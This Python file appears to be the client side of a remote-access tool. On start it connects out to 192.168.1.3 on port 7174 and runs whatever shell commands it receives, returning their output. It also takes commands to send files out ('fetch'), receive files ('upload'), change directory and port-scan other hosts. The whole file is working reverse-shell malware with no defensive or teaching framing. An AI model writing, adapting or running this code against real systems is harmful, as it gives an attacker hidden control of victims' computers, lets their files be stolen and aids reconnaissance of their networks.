from hashlib import new
import socket
import subprocess
import os


def scanner(s, ip, ports):
    scan_result = ""
    for port in ports:
        try:
            sock = socket.socket()
            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is open " + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed " + "\n"
                sock.close()
        except Exception:
            pass
    s.send(scan_result.encode())


def upload(s):
    print("File Receiving started....")
    f = open("D:\\Dahaka\\newFile.txt", "wb")
    while True:
        bits = s.recv(1024)
        if "File Not Found".encode() in bits:
            print("File Not Found")
            break
        elif bits.endswith("EOF".encode()):
            f.write(bits[:-4])
            f.close()
            print("[+] File Upload Successful")
            break
        f.write(bits)


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, "rb")
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
            s.send("EOF".encode())
    else:
        s.send("File not found".encode())


def changeDirectory(s, path):
    try:
        os.chdir(path)
        s.send((path + " >").encode())
    except Exception:
        s.send("Directory not found".encode())


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.3", 7174))
    while True:
        command = s.recv(1024)
        if "exit" in command.decode():
            s.close()
            break
        elif "fetch" in command.decode():
            fet, path = command.decode().split(" ")
            try:
                transfer(s, path)
            except (FileNotFoundError):
                s.send(FileNotFoundError)
        elif "upload" in command.decode():
            upload(s)
        elif "cd" in command.decode():
            c, path = command.decode().split(" ")
            changeDirectory(s, path)
        elif "scan" in command.decode():
            command = command[5:].decode()
            ip, ports = command.split(":")
            ports = ports.split(",")
            scanner(s, ip, ports)
        else:
            CMD = subprocess.Popen(
                command.decode(),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )
            try:
                s.send(CMD.stdout.read())
                s.send(CMD.stderr.read())
            except (Exception):
                s.send("[!]Invalid Command".encode())


def main():
    connect()


main()
